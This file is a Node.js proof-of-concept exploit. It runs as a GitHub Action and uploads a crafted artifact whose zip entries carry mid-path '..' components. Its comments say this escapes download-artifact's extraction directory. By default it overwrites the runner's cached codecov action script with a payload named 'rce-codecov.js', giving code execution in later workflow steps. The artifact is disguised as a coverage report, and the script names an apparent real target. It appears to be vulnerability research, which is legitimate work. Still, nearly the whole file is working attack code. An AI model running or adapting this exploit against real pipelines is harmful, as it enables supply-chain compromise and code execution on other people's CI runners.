#!/usr/bin/env node
// Runs as a JS action (ACTIONS_RUNTIME_TOKEN is not exposed to run: steps).
// Uploads an artifact whose zip entry names contain mid-path ".." components.
// actions/upload-artifact cannot produce such names (they come from real filesystem
// paths); this uses the same @actions/artifact internals with a handcrafted upload spec.
//
// Effect demonstrated: actions/download-artifact@v4's bundled unzip-stream@0.3.1
// sanitizer strips only LEADING dot-components, so a mid-path ".." escapes the
// extraction directory and the extractor writes outside `path`.
const fs = require('fs')
const path = require('path')

const A = '@actions/artifact'
const { createZipUploadStream } = require(`${A}/lib/internal/upload/zip`)
const { uploadZipToBlobStorage } = require(`${A}/lib/internal/upload/blob-upload`)
const { internalArtifactTwirpClient } = require(`${A}/lib/internal/shared/artifact-twirp-client`)
const { getBackendIdsFromToken } = require(`${A}/lib/internal/shared/util`)
const { StringValue } = require(`${A}/lib/generated`)

async function main () {
  const name = process.env.INPUT_NAME || 'coverage-report-ubuntu-latest-20.x'
  const pairs = (process.env.INPUT_PAIRS ||
    'poc-payload/rce-codecov.js->/home/runner/work/_actions/codecov/codecov-action/v4/dist/index.js').split(',')

  // extraction base used by the consumer: <workspace>/<artifact-name>
  const extractDir = path.join(process.env.RUNNER_TEMP, process.env.INPUT_EXTRACT_DIR ||
    'gab-poc-adobe-customer-profile-coverage/coverage-report-ubuntu-latest-20.x')
  const workspace = process.env.GITHUB_WORKSPACE

  const spec = []
  for (const pair of pairs) {
    const [src, target] = pair.split('->')
    const sourcePath = path.join(workspace, src.trim())
    const t = target.trim()
    const targetAbs = t.startsWith('/') ? t : path.join(workspace, t)
    // A non-dot first component ("x/") is required: the extractor's sanitizer
    // strips leading "../" sequences, but leaves mid-path ".." untouched.
    const destinationPath = 'x/' + path.relative(path.join(extractDir, 'x'), targetAbs)
    const resolved = path.join(extractDir, destinationPath)
    if (resolved !== targetAbs) throw new Error(`path computation mismatch: ${resolved} != ${targetAbs}`)
    console.log(`entry ${JSON.stringify(destinationPath)} -> resolves to ${resolved}`)
    spec.push({ sourcePath, destinationPath, stats: fs.lstatSync(sourcePath) })
  }

  const backendIds = getBackendIdsFromToken()
  const client = internalArtifactTwirpClient()

  const createResp = await client.CreateArtifact({
    workflowRunBackendId: backendIds.workflowRunBackendId,
    workflowJobRunBackendId: backendIds.workflowJobRunBackendId,
    name,
    version: 4
  })
  if (!createResp.ok) throw new Error('CreateArtifact: response not ok')

  const zipStream = await createZipUploadStream(spec)
  const uploadResult = await uploadZipToBlobStorage(createResp.signedUploadUrl, zipStream)

  const finalizeReq = {
    workflowRunBackendId: backendIds.workflowRunBackendId,
    workflowJobRunBackendId: backendIds.workflowJobRunBackendId,
    name,
    size: uploadResult.uploadSize ? uploadResult.uploadSize.toString() : '0'
  }
  if (uploadResult.sha256Hash) finalizeReq.hash = StringValue.create({ value: `sha256:${uploadResult.sha256Hash}` })

  const finalizeResp = await client.FinalizeArtifact(finalizeReq)
  if (!finalizeResp.ok) throw new Error('FinalizeArtifact: response not ok')

  console.log(`artifact ${name} uploaded: id=${finalizeResp.artifactId} size=${uploadResult.uploadSize}`)
}

main().catch(e => {
  console.error(e)
  process.exit(1)
})
